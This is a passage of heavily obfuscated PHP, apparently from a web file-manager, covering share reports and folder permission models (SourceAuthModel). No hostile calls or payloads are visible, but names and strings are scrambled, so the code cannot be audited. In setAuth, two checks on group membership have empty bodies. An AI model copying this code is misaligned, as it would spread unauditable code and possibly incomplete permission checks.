fšƒÄ¡‰Û•: $DÖØ¼…âœ = $DÖØ¼…âœ . "{$C½İÚÏÃÔŒ}\40{$FÜ…¸Ğ¡§­}"; return $this->order($DÖØ¼…âœ); goto D§¹º¾Æ; fÄéÂÚß¼¨: $C¶ „ÆÇà =& $_SERVER[Ç³Íß¦Ó]; $cá¡¨ƒ‚¢ = array($C¶ „ÆÇà[193], $C¶ „ÆÇà[474], $C¶ „ÆÇà[1835], $C¶ „ÆÇà[1836]); $B…‘—Æï«ã = array($C¶ „ÆÇà[426] => $C¶ „ÆÇà[427], $C¶ „ÆÇà[428] => $C¶ „ÆÇà[429]); goto c”‘»¢”; c”‘»¢”: $C½İÚÏÃÔŒ = Input::get($C¶ „ÆÇà[433], $C¶ „ÆÇà[7], $C¶ „ÆÇà[414], $cá¡¨ƒ‚¢); $FÜ…¸Ğ¡§­ = Input::get($C¶ „ÆÇà[434], $C¶ „ÆÇà[7], $C¶ „ÆÇà[1847], array($C¶ „ÆÇà[1771], $C¶ „ÆÇà[428])); $FÜ…¸Ğ¡§­ = $B…‘—Æï«ã[$FÜ…¸Ğ¡§­]; goto fšƒÄ¡‰Û•; D§¹º¾Æ: } public function reportAdd($BØƒ¶½‰ï) { $dƒÃ¿¦”÷ê =& $_SERVER[Ç³Íß¦Ó]; $fŒ‹ª´¯è× = array($dƒÃ¿¦”÷ê[466] => $BØƒ¶½‰ï[$dƒÃ¿¦”÷ê[466]], $dƒÃ¿¦”÷ê[1526] => USER_ID); if (Model($dƒÃ¿¦”÷ê[1843])->where($fŒ‹ª´¯è×)->find()) { return !1; } $B–¬³Á†Ù¢ = array($dƒÃ¿¦”÷ê[466] => $BØƒ¶½‰ï[$dƒÃ¿¦”÷ê[466]], $dƒÃ¿¦”÷ê[1432] => $BØƒ¶½‰ï[$dƒÃ¿¦”÷ê[1432]], $dƒÃ¿¦”÷ê[394] => $BØƒ¶½‰ï[$dƒÃ¿¦”÷ê[394]], $dƒÃ¿¦”÷ê[445] => $BØƒ¶½‰ï[$dƒÃ¿¦”÷ê[445]], $dƒÃ¿¦”÷ê[1526] => USER_ID, $dƒÃ¿¦”÷ê[29] => $BØƒ¶½‰ï[$dƒÃ¿¦”÷ê[29]], $dƒÃ¿¦”÷ê[429] => $BØƒ¶½‰ï[$dƒÃ¿¦”÷ê[429]]); return Model($dƒÃ¿¦”÷ê[1843])->add($B–¬³Á†Ù¢); } public function reportList($dÍµĞ‹ƒÙš) { goto Eîòá×Îâ‡; c‡¼’†ñÊ: $c¯Èî’—ª÷ = array($CÀ«šÛ÷[426] => $CÀ«šÛ÷[427], $CÀ«šÛ÷[428] => $CÀ«šÛ÷[429]); $bò­²¤—äÒ = $CÀ«šÛ÷[1852] . $c¯Èî’—ª÷[$bİÀÛÆŠÎ²]; $a·ÆºŞ·—¹ = Model($CÀ«šÛ÷[1843])->where($eÒÙÏšŒ)->order($bò­²¤—äÒ)->selectPage(20); goto BÍ¨ÆÈïßÛ; bÉí²Ì‡Åº: $this->_listDataApply($a·ÆºŞ·—¹[$CÀ«šÛ÷[366]]); return $a·ÆºŞ·—¹; goto Eİ‹¹ŠÊ´´; BÍ¨ÆÈïßÛ: if (empty($a·ÆºŞ·—¹[$CÀ«šÛ÷[366]])) { return array(); } $BÙîÕ×÷ÔÊ = array_to_keyvalue_group($a·ÆºŞ·—¹[$CÀ«šÛ÷[366]], $CÀ«šÛ÷[714], $CÀ«šÛ÷[466]); if (!empty($BÙîÕ×÷ÔÊ[0])) { $dÍµĞ‹ƒÙš = $BÙîÕ×÷ÔÊ[0]; $eÒÙÏšŒ = array($CÀ«šÛ÷[466] => array($CÀ«šÛ÷[7], $dÍµĞ‹ƒÙš)); $b¾’Œ©Ò³ = $this->where($eÒÙÏšŒ)->field($CÀ«šÛ÷[466])->select(); $b¾’Œ©Ò³ = array_to_keyvalue($b¾’Œ©Ò³, $CÀ«šÛ÷[33], $CÀ«šÛ÷[466]); $F—ë¢àÌ‹ˆ = array_diff($dÍµĞ‹ƒÙš, $b¾’Œ©Ò³); if (!empty($F—ë¢àÌ‹ˆ)) { foreach ($a·ÆºŞ·—¹[$CÀ«šÛ÷[366]] as $c¤å¢‡Ìø© => $fàÎö“Ô¥ß) { if (in_array($fàÎö“Ô¥ß[$CÀ«šÛ÷[466]], $F—ë¢àÌ‹ˆ)) { unset($a·ÆºŞ·—¹[$CÀ«šÛ÷[366]][$c¤å¢‡Ìø©]); } } } } goto bÉí²Ì‡Åº; Eîòá×Îâ‡: $CÀ«šÛ÷ =& $_SERVER[Ç³Íß¦Ó]; $eÒÙÏšŒ = array(); if ($dÍµĞ‹ƒÙš[$CÀ«šÛ÷[722]]) { $D¡ÁÑ‘² = $dÍµĞ‹ƒÙš[$CÀ«šÛ÷[474]] ? $dÍµĞ‹ƒÙš[$CÀ«šÛ÷[474]] : strtotime(date($CÀ«šÛ÷[1845])); $eÒÙÏšŒ[$CÀ«šÛ÷[193]] = array($CÀ«šÛ÷[330], array($dÍµĞ‹ƒÙš[$CÀ«šÛ÷[722]], $D¡ÁÑ‘²)); } goto f’­—ôÍ¨œ; f’­—ôÍ¨œ: if (isset($dÍµĞ‹ƒÙš[$CÀ«šÛ÷[29]]) && in_array($dÍµĞ‹ƒÙš[$CÀ«šÛ÷[29]], array($CÀ«šÛ÷[87], $CÀ«šÛ÷[1848], $CÀ«šÛ÷[1849], $CÀ«šÛ÷[1850], $CÀ«šÛ÷[1851]))) { $eÒÙÏšŒ[$CÀ«šÛ÷[29]] = $dÍµĞ‹ƒÙš[$CÀ«šÛ÷[29]]; } if (isset($dÍµĞ‹ƒÙš[$CÀ«šÛ÷[714]]) && in_array($dÍµĞ‹ƒÙš[$CÀ«šÛ÷[714]], array($CÀ«šÛ÷[495], $CÀ«šÛ÷[87], $CÀ«šÛ÷[1848], $CÀ«šÛ÷[1849]))) { $eÒÙÏšŒ[$CÀ«šÛ÷[714]] = $dÍµĞ‹ƒÙš[$CÀ«šÛ÷[714]]; } $bİÀÛÆŠÎ² = Input::get($CÀ«šÛ÷[434], $CÀ«šÛ÷[7], $CÀ«šÛ÷[1847], array($CÀ«šÛ÷[1771], $CÀ«šÛ÷[428])); goto c‡¼’†ñÊ; Eİ‹¹ŠÊ´´: } public function reportStatus($c®†…ø¤¨Ğ) { goto Bº•ÔÇ‚; Bº•ÔÇ‚: $b¨«Ï¼éË =& $_SERVER[Ç³Íß¦Ó]; $eÀÈĞ‡ÍƒÀ = array($b¨«Ï¼éË[392] => $c®†…ø¤¨Ğ[$b¨«Ï¼éË[392]]); $E´ˆî†© = Model($b¨«Ï¼éË[1843])->where($eÀÈĞ‡ÍƒÀ)->field($b¨«Ï¼éË[1853])->find(); goto Fª„¿œİò¬; b‰íì¿åî÷: $DĞƒğÄ˜Á¢ = Model($b¨«Ï¼éË[1843])->where($eÀÈĞ‡ÍƒÀ)->save($f’ªåÂÎ¦ö); if ($c®†…ø¤¨Ğ[$b¨«Ï¼éË[714]] == $b¨«Ï¼éË[1848]) { if ($E´ˆî†©[$b¨«Ï¼éË[445]] != $b¨«Ï¼éË[495] && $this->shareFileMeta($E´ˆî†©[$b¨«Ï¼éË[445]])) { $this->shareFileMeta($E´ˆî†©[$b¨«Ï¼éË[445]], 0); } $this->remove($E´ˆî†©[$b¨«Ï¼éË[466]]); return !0; } if ($DĞƒğÄ˜Á¢ && $c®†…ø¤¨Ğ[$b¨«Ï¼éË[714]] == $b¨«Ï¼éË[1849]) { $Eôğ™¯“àŸ = $f’ªåÂÎ¦ö[$b¨«Ï¼éË[714]] == $b¨«Ï¼éË[1849] ? 1 : 0; $this->shareFileMeta($E´ˆî†©[$b¨«Ï¼éË[445]], $Eôğ™¯“àŸ); $this->removeByFile($E´ˆî†©[$b¨«Ï¼éË[445]]); } goto B›õ­æ•Å¢; Fª„¿œİò¬: if (!$E´ˆî†©) { return !1; } $f’ªåÂÎ¦ö = array($b¨«Ï¼éË[714] => $c®†…ø¤¨Ğ[$b¨«Ï¼éË[714]]); if ($c®†…ø¤¨Ğ[$b¨«Ï¼éË[714]] == $b¨«Ï¼éË[1849] && $E´ˆî†©[$b¨«Ï¼éË[714]] == $b¨«Ï¼éË[1849]) { $f’ªåÂÎ¦ö[$b¨«Ï¼éË[714]] = 0; } goto b‰íì¿åî÷; B›õ­æ•Å¢: return $DĞƒğÄ˜Á¢; goto E‚õ™ñÖÑ; E‚õ™ñÖÑ: } private function removeByFile($fß˜© Ÿ™À) { goto eä»Äì†‹š; eä»Äì†‹š: $c¥ÀÅÔôÛİ =& $_SERVER[Ç³Íß¦Ó]; $c•‚«Òçï« = Model($c¥ÀÅÔôÛİ[791])->where(array($c¥ÀÅÔôÛİ[445] => $fß˜© Ÿ™À))->field($c¥ÀÅÔôÛİ[394])->select(); $aÇìå¶í = array_to_keyvalue($c•‚«Òçï«, $c¥ÀÅÔôÛİ[33], $c¥ÀÅÔôÛİ[394]); goto e‰ §™¸µ; eïç§¦±¨÷: $E¦ÍçŒÖé = array_to_keyvalue($c•‚«Òçï«, $c¥ÀÅÔôÛİ[33], $c¥ÀÅÔôÛİ[466]); $this->remove($E¦ÍçŒÖé); goto eÉ­¶ç‹ùÉ; e‰ §™¸µ: $bµÑ‡ë‰Š¥ = array($c¥ÀÅÔôÛİ[394] => array($c¥ÀÅÔôÛİ[7], $aÇìå¶í), $c¥ÀÅÔôÛİ[471] => 1); $c•‚«Òçï« = $this->where($bµÑ‡ë‰Š¥)->field($c¥ÀÅÔôÛİ[466])->select(); if (empty($c•‚«Òçï«)) { return; } goto eïç§¦±¨÷; eÉ­¶ç‹ùÉ: } private function shareFileMeta($Aµ¤¥Èœ¶Ì, $DÛ«®Üˆ­ß = null) { $bêƒƒƒ«é =& $_SERVER[Ç³Íß¦Ó]; $CÉ”Œ„ŠÃØ = array($bêƒƒƒ«é[445] => $Aµ¤¥Èœ¶Ì, $bêƒƒƒ«é[93] => $bêƒƒƒ«é[1854]); if (is_null($DÛ«®Üˆ­ß)) { return Model($bêƒƒƒ«é[1855])->where($CÉ”Œ„ŠÃØ)->find(); } $CÉ”Œ„ŠÃØ[$bêƒƒƒ«é[371]] = $DÛ«®Üˆ­ß; Model($bêƒƒƒ«é[1855])->add($CÉ”Œ„ŠÃØ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\x72\x63\x65\137\141\165\x74\150"; public function getAuth($céÄÃ¬ôºª) { goto C‡Ñ„·†²Ş; B³ê½«œ˜¹: array_multisort($Eé»åÙëë‘, SORT_DESC, $f¶ŸÛÈÎ‹İ); return $f¶ŸÛÈÎ‹İ; goto d‹»Ø¤¬®ğ; d‚åÈŸ¥¦™: $Eé»åÙëë‘ = array(); $CÅ‰£†Ç­ã = 2 << 25; foreach ($f°¹”´»µ£ as $A‰Ú²÷·Å) { goto Fºµ‡Ò¡ÏÎ; Fºµ‡Ò¡ÏÎ: $D…ŸĞ ëª§ = Model($BÂù¨Ê…†¼[1856])->listData($A‰Ú²÷·Å[$BÂù¨Ê…†¼[1784]]); if (!$D…ŸĞ ëª§) { continue; } $f¶ŸÛÈÎ‹İ[] = $A‰Ú²÷·Å; goto F„¤¼ËŒ·§; a»ó˜ãæŞŒ: if ($A‰Ú²÷·Å[$BÂù¨Ê…†¼[402]] == SourceModel::TYPE_USER && $A‰Ú²÷·Å[$BÂù¨Ê…†¼[482]] == $BÂù¨Ê…†¼[495]) { $CÃ¯˜¦ÆË = 0; } $Eé»åÙëë‘[] = $D…ŸĞ ëª§[$BÂù¨Ê…†¼[404]] + $CÃ¯˜¦ÆË; goto e£…‹åš˜; F„¤¼ËŒ·§: $CÃ¯˜¦ÆË = 0; if ($A‰Ú²÷·Å[$BÂù¨Ê…†¼[402]] == SourceModel::TYPE_GROUP) { $CÃ¯˜¦ÆË = $CÅ‰£†Ç­ã * 2; } if ($A‰Ú²÷·Å[$BÂù¨Ê…†¼[402]] == SourceModel::TYPE_USER) { $CÃ¯˜¦ÆË = $CÅ‰£†Ç­ã; } goto a»ó˜ãæŞŒ; e£…‹åš˜: } goto B³ê½«œ˜¹; C‡Ñ„·†²Ş: $BÂù¨Ê…†¼ =& $_SERVER[Ç³Íß¦Ó]; $f°¹”´»µ£ = $this->sourceAuthSelect($céÄÃ¬ôºª); $f¶ŸÛÈÎ‹İ = array(); goto d‚åÈŸ¥¦™; d‹»Ø¤¬®ğ: } public function sourceAuthSelect($B¬ÑµˆÃùê) { goto AŠ…İ±ù¢Ü; Bñ˜£È«ô: if ($B“¡¡¦¨ „) { $B¬ÑµˆÃùê = array($B¬ÑµˆÃùê); } $bÎ‡æâÉ­Õ = array(); foreach ($B¬ÑµˆÃùê as $bÔâ¼÷ˆ¾) { if (isset($DÃ“’¤äŞ[$bÔâ¼÷ˆ¾])) { $bÎ‡æâÉ­Õ[$bÔâ¼÷ˆ¾] = $DÃ“’¤äŞ[$bÔâ¼÷ˆ¾]; } } goto A½ÜŸÚ¬Ë; Fè‰“‚ÌœÍ: if ($B“¡¡¦¨ „) { return $BìÜÄ§Í¡¶; } return $b£–‹òø„ó; goto dÉŞµ…ÙÁØ; aÂÆù‹Ù²ì: $BìÜÄ§Í¡¶ = $this->field($f×ë¦ö‡•Ö)->order($cÓøİÙ¢ßñ[392])->where($aÓí´ÒæÓ)->select(); $b£–‹òø„ó = array_to_keyvalue_group($BìÜÄ§Í¡¶, $cÓøİÙ¢ßñ[394]); foreach ($B¬ÑµˆÃùê as $bÔâ¼÷ˆ¾) { $DÃ“’¤äŞ[$bÔâ¼÷ˆ¾] = $b£–‹òø„ó[$bÔâ¼÷ˆ¾] ? $b£–‹òø„ó[$bÔâ¼÷ˆ¾] : array(); } goto Fè‰“‚ÌœÍ; AŠ…İ±ù¢Ü: $cÓøİÙ¢ßñ =& $_SERVER[Ç³Íß¦Ó]; static $DÃ“’¤äŞ = array(); $B“¡¡¦¨ „ = is_array($B¬ÑµˆÃùê) ? !1 : !0; goto Bñ˜£È«ô; A½ÜŸÚ¬Ë: if (count($bÎ‡æâÉ­Õ) == count($B¬ÑµˆÃùê)) { return $B“¡¡¦¨ „ ? $bÎ‡æâÉ­Õ[$B¬ÑµˆÃùê[0]] : $bÎ‡æâÉ­Õ; } $f×ë¦ö‡•Ö = $cÓøİÙ¢ßñ[1857]; $aÓí´ÒæÓ = array($cÓøİÙ¢ßñ[394] => array($cÓøİÙ¢ßñ[7], $B¬ÑµˆÃùê)); goto aÂÆù‹Ù²ì; dÉŞµ…ÙÁØ: } public function setAuth($F„œ„©«áÊ, $Dæ “é”Ø¯) { goto FŒÚ¦¯˜Ã; C¦Ø„øŠöÇ: if ($DĞòÍ–¯ != $DŞÙ”ŒŠ©») { $aÉ¼Ñµ¬²ò = array($aàà¤´òˆ¿[1689] => $DĞòÍ–¯); $Câ´§·†à© = Model($aàà¤´òˆ¿[1770])->field($aàà¤´òˆ¿[1526])->where($aÉ¼Ñµ¬²ò)->select(); $Câ´§·†à© = array_to_keyvalue($Câ´§·†à©, $aàà¤´òˆ¿[33], $aàà¤´òˆ¿[1526]); } $F«Ÿ©£–ñÕ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $B×š¦´÷â° = array(); goto fÎ‹éŸ×Îí; A‘ö•õ›ë¡: return !0; goto c•ŠÔ¦£©Ï; Aš…‹À¿Æš: if ($fºÕÙ‚„±[$aàà¤´òˆ¿[402]] != SourceModel::TYPE_GROUP) { return !1; } $DŞÙ”ŒŠ©» = 1; $DĞòÍ–¯ = $fºÕÙ‚„±[$aàà¤´òˆ¿[482]]; goto C¦Ø„øŠöÇ; FŒÚ¦¯˜Ã: $aàà¤´òˆ¿ =& $_SERVER[Ç³Íß¦Ó]; $fºÕÙ‚„± = Model($aàà¤´òˆ¿[1204])->sourceInfo($F„œ„©«áÊ); if (!$fºÕÙ‚„±) { return !1; } goto Aš…‹À¿Æš; fÎ‹éŸ×Îí: foreach ($Dæ “é”Ø¯ as $Fš×îòÌª‰) { if (!in_array($Fš×îòÌª‰[$aàà¤´òˆ¿[402]], $F«Ÿ©£–ñÕ)) { show_json(LNG($aàà¤´òˆ¿[1858]), !1); } if ($DĞòÍ–¯ != $DŞÙ”ŒŠ©») { if ($Fš×îòÌª‰[$aàà¤´òˆ¿[402]] == SourceModel::TYPE_GROUP) { } if ($Fš×îòÌª‰[$aàà¤´òˆ¿[482]] != 0 && !in_array($Fš×îòÌª‰[$aàà¤´òˆ¿[482]], $Câ´§·†à©)) { } } if ($Fš×îòÌª‰[$aàà¤´òˆ¿[482]] == 0) { $Fš×îòÌª‰[$aàà¤´òˆ¿[402]] = SourceModel::TYPE_USER; } $B×š¦´÷â°[] = array($aàà¤´òˆ¿[394] => $F„œ„©«áÊ, $aàà¤´òˆ¿[402] => intval($Fš×îòÌª‰[$aàà¤´òˆ¿[402]]), $aàà¤´òˆ¿[482] => intval($Fš×îòÌª‰[$aàà¤´òˆ¿[482]]), $aàà¤´òˆ¿[1784] => intval($Fš×îòÌª‰[$aàà¤´òˆ¿[1784]]) ? intval($Fš×îòÌª‰[$aàà¤´òˆ¿[1784]]) : 0, $aàà¤´òˆ¿[1838] => intval($Fš×îòÌª‰[$aàà¤´òˆ¿[1838]]) ? intval($Fš×îòÌª‰[$aàà¤´òˆ¿[1838]]) : -1); } $this->where(array($aàà¤´òˆ¿[408] => $F„œ„©«áÊ))->delete(); $this->addAll($B×š¦´÷â°); goto A‘ö•õ›ë¡; c•ŠÔ¦£©Ï: } public function authClear($cšÂ±ºëã‘) { $C†Ãµ¼—ø† =& $_SERVER[Ç³Íß¦Ó]; $B»­âŸ¨Ø¶ = Model($C†Ãµ¼—ø†[1204])->sourceInfo($cšÂ±ºëã‘); $aµŠ×é¯ = array($cšÂ±ºëã‘); if ($B»­âŸ¨Ø¶[$C†Ãµ¼—ø†[401]] == $C†Ãµ¼—ø†[87]) { $e˜Ì“Õ ßô = array($C†Ãµ¼—ø†[552] => array($C†Ãµ¼—ø†[511], $B»­âŸ¨Ø¶[$C†Ãµ¼—ø†[485]] . $cšÂ±ºëã‘ . $C†Ãµ¼—ø†[512])); $aµŠ×é¯ = Model($C†Ãµ¼—ø†[1204])->field($C†Ãµ¼—ø†[408])->where($e˜Ì“Õ ßô)->getField($C†Ãµ¼—ø†[394], !0); $aµŠ×é¯[] = $cšÂ±ºëã‘; } $this->where(array($C†Ãµ¼—ø†[408] => array($C†Ãµ¼—ø†[409], $aµŠ×é¯)))->delete(); return !0; } public function getAllChildren($Dç˜êöêÆô) { goto Dù‚©÷Éğ³; c¹÷î‘™—ˆ: if ($A««‹‰«êÖ[$C¬ØÚÍÕ[476]] == $C¬ØÚÍÕ[495] && $A««‹‰«êÖ[$C¬ØÚÍÕ[482]] != $AîğßŞôÛŠ) { $BÅ´¸Áó”“ = $this->groupChidldAllRootSource($A««‹‰«êÖ[$C¬ØÚÍÕ[482]]); } $E ½­–ï¬¯ = $this->field($C¬ØÚÍÕ[394])->group($C¬ØÚÍÕ[394])->select(); $E ½­–ï¬¯ = array_to_keyvalue($E ½­–ï¬¯, $C¬ØÚÍÕ[33], $C¬ØÚÍÕ[394]); goto Dô•Ú˜À³ñ; aÂƒ…ñÎ: return $this->sourceListAuth($f®¥½¥»Œ); goto e ùŠ¿‹ïó; B¿³Õ«›š: $Aƒùåˆª» = Model($C¬ØÚÍÕ[791])->field($cÅê«ğ®ê‚)->where($EÍ‹ƒĞœ§¾)->select(); $f®¥½¥»Œ = array($Dç˜êöêÆô); foreach ($Aƒùåˆª» as $C–õ„‚°»ø) { foreach ($BÅ´¸Áó”“ as $F²¢°Ï‡Ä) { $b²†§Œ“… = $C¬ØÚÍÕ[47] . $F²¢°Ï‡Ä . $C¬ØÚÍÕ[47]; $c—î¦£Ö = $C–õ„‚°»ø[$C¬ØÚÍÕ[485]] . $C–õ„‚°»ø[$C¬ØÚÍÕ[394]] . $C¬ØÚÍÕ[47]; if (strstr($c—î¦£Ö, $b²†§Œ“…)) { $f®¥½¥»Œ[] = $C–õ„‚°»ø[$C¬ØÚÍÕ[394]]; break; } } } goto aÂƒ…ñÎ; Dô•Ú˜À³ñ: if (!$E ½­–ï¬¯) { return array(); } $cÅê«ğ®ê‚ = $C¬ØÚÍÕ[1859]; $EÍ‹ƒĞœ§¾ = array($C¬ØÚÍÕ[394] => array($C¬ØÚÍÕ[7], $E ½­–ï¬¯), $C¬ØÚÍÕ[421] => $C¬ØÚÍÕ[495]); goto B¿³Õ«›š; Dù‚©÷Éğ³: $C¬ØÚÍÕ =& $_SERVER[Ç³Íß¦Ó]; $A««‹‰«êÖ = Model($C¬ØÚÍÕ[1204])->sourceInfo($Dç˜êöêÆô); if ($A««‹‰«êÖ[$C¬ØÚÍÕ[401]] != $C¬ØÚÍÕ[87]) { return $this->sourceListAuth(array($Dç˜êöêÆô)); } goto a½èèÂß‡±; a½èèÂß‡±: if ($A««‹‰«êÖ[$C¬ØÚÍÕ[402]] != SourceModel::TYPE_GROUP) { return array(); } $AîğßŞôÛŠ = 1; $BÅ´¸Áó”“ = array($Dç˜êöêÆô); goto c¹÷î‘™—ˆ; e ùŠ¿‹ïó: } private function sourceListAuth($a“ñÊ…¦È¶) { goto e¯£ÆÌã—î; e¯£ÆÌã—î: $DëÍ¼¹´¼Î =& $_SERVER[Ç³Íß¦Ó]; $DÒµ±Ø‰£á = Model($DëÍ¼¹´¼Î[1204])->sourceListInfo($a“ñÊ…¦È¶, !0); $eïÃÁĞÑ«ğ = $this->sourceAuthSelect($a“ñÊ…¦È¶); goto aòçÛ×êùÄ; aòçÛ×êùÄ: $E­„Š»²–ì = array(); $bê‘“äÊÃ = array(); foreach ($DÒµ±Ø‰£á as $bœÕªí£Ç) { goto EÍê÷ß±; EÍê÷ß±: unset($bœÕªí£Ç[$DëÍ¼¹´¼Î[432]]); unset($bœÕªí£Ç[$DëÍ¼¹´¼Î[430]]); unset($bœÕªí£Ç[$DëÍ¼¹´¼Î[404]]); goto cÆÂ”Ú‘«¿; dµÌÔõĞ¼†: $aŒº‹°œ† = count(explode($DëÍ¼¹´¼Î[8], trim($bœÕªí£Ç[$DëÍ¼¹´¼Î[493]], $DëÍ¼¹´¼Î[8]))); $bê‘“äÊÃ[] = $aŒº‹°œ† + ($bœÕªí£Ç[$DëÍ¼¹´¼Î[29]] == $DëÍ¼¹´¼Î[77] ? 0 : 1000); goto aÆÚĞêÈå; C¤ğ³äŒî‚: $bœÕªí£Ç[$DëÍ¼¹´¼Î[1860]] = $this->authTargetInfo($e¼‘‰ññÅË); $bœÕªí£Ç[$DëÍ¼¹´¼Î[493]] = rtrim($bœÕªí£Ç[$DëÍ¼¹´¼Î[488]], $DëÍ¼¹´¼Î[8]) . $DëÍ¼¹´¼Î[8] . ltrim($bœÕªí£Ç[$DëÍ¼¹´¼Î[493]], $DëÍ¼¹´¼Î[8]); $E­„Š»²–ì[] = $bœÕªí£Ç; goto dµÌÔõĞ¼†; cÆÂ”Ú‘«¿: unset($bœÕªí£Ç[$DëÍ¼¹´¼Î[85]]); $e¼‘‰ññÅË = $eïÃÁĞÑ«ğ[$bœÕªí£Ç[$DëÍ¼¹´¼Î[394]]]; if (!$e¼‘‰ññÅË) { continue; } goto C¤ğ³äŒî‚; aÆÚĞêÈå: } goto c¬æˆ»Ùëì; c¬æˆ»Ùëì: array_multisort($bê‘“äÊÃ, SORT_ASC, $E­„Š»²–ì); return $E­„Š»²–ì; goto cã–ªÇºë; cã–ªÇºë: } private function groupChidldAllRootSource($C™ù™œîåµ) { $CÊ–œ¬½‘Ì =& $_SERVER[Ç³Íß¦Ó]; $bæŞæ³•Œ = Model($CÊ–œ¬½‘Ì[1861])->groupChildrenAll($C™ù™œîåµ); $fŞ“Ø®Ã¼ = array($CÊ–œ¬½‘Ì[476] => 0, $CÊ–œ¬½‘Ì[482] => array($CÊ–œ¬½‘Ì[7], $bæŞæ³•Œ), $CÊ–œ¬½‘Ì[402] => SourceModel::TYPE_GROUP); $b¶´ó¼©½ = Model($CÊ–œ¬½‘Ì[791])->field($CÊ–œ¬½‘Ì[394])->where($fŞ“Ø®Ã¼)->select(); $b¶´ó¼©½ = array_to_keyvalue($b¶´ó¼©½, $CÊ–œ¬½‘Ì[33], $CÊ–œ¬½‘Ì[394]); return $b¶´ó¼©½; } private function authTargetInfo($a´œôÑ„‘†) { goto c»ºŠ˜“ÏÉ; dÜ‹‘ÆÄô: return $Cº‡ãˆ„Æğ; goto bÚ—ªß«ĞÅ; aãÅ¬’Ö²: $B˜ó­ã‹‰’ = 2 << 25; foreach ($a´œôÑ„‘† as $Aµ™èİÇ¿Õ) { goto d†ƒÂ”®‘Ñ; EµŒä›¥µ: if (!$fº„ê¾àœ½) { continue; } $fº„ê¾àœ½[$d˜õ„¹Îö[444]] = $e£“à¦ÓÎ­; $Cº‡ãˆ„Æğ[] = $fº„ê¾àœ½; goto EĞ´ù¬Ê; f‡¡ˆ‚±Üğ: if ($Aµ™èİÇ¿Õ[$d˜õ„¹Îö[402]] == SourceModel::TYPE_USER && $Aµ™èİÇ¿Õ[$d˜õ„¹Îö[482]] == $d˜õ„¹Îö[495]) { $dˆ„ˆœîò£ = 0; } $CîŞµ®¤•ã[] = $e£“à¦ÓÎ­[$d˜õ„¹Îö[404]] + $dˆ„ˆœîò£; goto fìåƒâ¾¼Ü; EĞ´ù¬Ê: $dˆ„ˆœîò£ = 0; if ($Aµ™èİÇ¿Õ[$d˜õ„¹Îö[402]] == SourceModel::TYPE_GROUP) { $dˆ„ˆœîò£ = $B˜ó­ã‹‰’ * 2; } if ($Aµ™èİÇ¿Õ[$d˜õ„¹Îö[402]] == SourceModel::TYPE_USER) { $dˆ„ˆœîò£ = $B˜ó­ã‹‰’; } goto f‡¡ˆ‚±Üğ; d†ƒÂ”®‘Ñ: $e£“à¦ÓÎ­ = Model($d˜õ„¹Îö[1856])->listData($Aµ™èİÇ¿Õ[$d˜õ„¹Îö[1784]]); if (!$e£“à¦ÓÎ­) { continue; } if ($Aµ™èİÇ¿Õ[$d˜õ„¹Îö[402]] == SourceModel::TYPE_USER) { $fº„ê¾àœ½ = Model($d˜õ„¹Îö[501])->getInfoSimpleOuter($Aµ™èİÇ¿Õ[$d˜õ„¹Îö[482]]); if ($fº„ê¾àœ½[$d˜õ„¹Îö[1526]] == $d˜õ„¹Îö[1085]) { continue; } if ($fº„ê¾àœ½[$d˜õ„¹Îö[1526]] == $d˜õ„¹Îö[495]) { $fº„ê¾àœ½[$d˜õ„¹Îö[28]] = LNG($d˜õ„¹Îö[1862]); } } else { $fº„ê¾àœ½ = Model($d˜õ„¹Îö[484])->getInfoSimple($Aµ™èİÇ¿Õ[$d˜õ„¹Îö[482]]); } goto EµŒä›¥µ; fìåƒâ¾¼Ü: } array_multisort($CîŞµ®¤•ã, SORT_DESC, $Cº‡ãˆ„Æğ); goto dÜ‹‘ÆÄô; c»ºŠ˜“ÏÉ: $d˜õ„¹Îö =& $_SERVER[Ç³Íß¦Ó]; $Cº‡ãˆ„Æğ = array(); $CîŞµ®¤•ã = array(); goto aãÅ¬’Ö²; bÚ—ªß«ĞÅ: } public function getAllChildrenByUser($càÁ±ÌÔ–„, $D´ë§ˆ£ö) { goto bÆãŞ”‰•É; bÆãŞ”‰•É: $a¾ìƒ…Õ¾è =& $_SERVER[Ç³Íß¦Ó]; $aÂ×ãóœˆ§ = Model($a¾ìƒ…Õ¾è[505])->getInfo($D´ë§ˆ£ö); if (!$D´ë§ˆ£ö || !$càÁ±ÌÔ–„ || !$aÂ×ãóœˆ§) { return array(); } goto aÏæ›â¼º; aÏæ›â¼º: $aˆ®´øÈ² = Model($a¾ìƒ…Õ¾è[1204])->sourceInfo($càÁ±ÌÔ–„); $A¨ŒÎÖ¯ù = array(); $Cñù…ªÁó = 1; goto A‰ÄŒù•Öñ; E±ˆ¹‰ä¸‘: return $DÎ…»ÌÂ»‘; goto F·½£¿×ã‹; A‰ÄŒù•Öñ: if ($aˆ®´øÈ²[$a¾ìƒ…Õ¾è[476]] == $a¾ìƒ…Õ¾è[495] && $aˆ®´øÈ²[$a¾ìƒ…Õ¾è[482]] != $Cñù…ªÁó && $this->groupContainUser($aˆ®´øÈ²[$a¾ìƒ…Õ¾è[482]], $D´ë§ˆ£ö)) { foreach ($aÂ×ãóœˆ§[$a¾ìƒ…Õ¾è[1863]] as $DŠĞë•…›¬) { $DÚŒ…¨ŒÀ = Model($a¾ìƒ…Õ¾è[484])->getInfo($DŠĞë•…›¬[$a¾ìƒ…Õ¾è[1689]]); $b„ôßÔŠ” = Model($a¾ìƒ…Õ¾è[505])->getInfoSimpleOuter($D´ë§ˆ£ö); $b„ôßÔŠ”[$a¾ìƒ…Õ¾è[444]] = $DŠĞë•…›¬[$a¾ìƒ…Õ¾è[404]]; if (Model($a¾ìƒ…Õ¾è[1856])->authCheckAction($DŠĞë•…›¬[$a¾ìƒ…Õ¾è[404]][$a¾ìƒ…Õ¾è[404]], $a¾ìƒ…Õ¾è[1709])) { continue; } $d—¾˜™ùá = array($a¾ìƒ…Õ¾è[28] => $a¾ìƒ…Õ¾è[1479] . $DÚŒ…¨ŒÀ[$a¾ìƒ…Õ¾è[28]], $a¾ìƒ…Õ¾è[394] => $DÚŒ…¨ŒÀ[$a¾ìƒ…Õ¾è[85]][$a¾ìƒ…Õ¾è[394]], $a¾ìƒ…Õ¾è[76] => KodIO::make($DÚŒ…¨ŒÀ[$a¾ìƒ…Õ¾è[85]][$a¾ìƒ…Õ¾è[394]]), $a¾ìƒ…Õ¾è[476] => $a¾ìƒ…Õ¾è[495], $a¾ìƒ…Õ¾è[402] => $a¾ìƒ…Õ¾è[1015], $a¾ìƒ…Õ¾è[29] 